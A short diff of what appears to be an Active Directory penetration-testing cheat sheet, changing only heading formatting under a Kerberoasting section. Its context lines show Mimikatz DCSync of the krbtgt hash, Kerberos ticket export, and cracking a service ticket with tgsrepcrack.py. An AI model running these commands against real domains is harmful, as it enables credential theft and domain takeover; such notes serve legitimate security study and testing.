@@ -359,7 +359,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 # Privilege Escalation
 
-###Kerberoast
+### Kerberoast
 
 **1. Enumeration with Powerview:**
 ```powershell
@@ -388,4 +388,4 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi
 ```
 
-###Targeted Kerberoasting AS REPs
+### Targeted Kerberoasting AS REPs
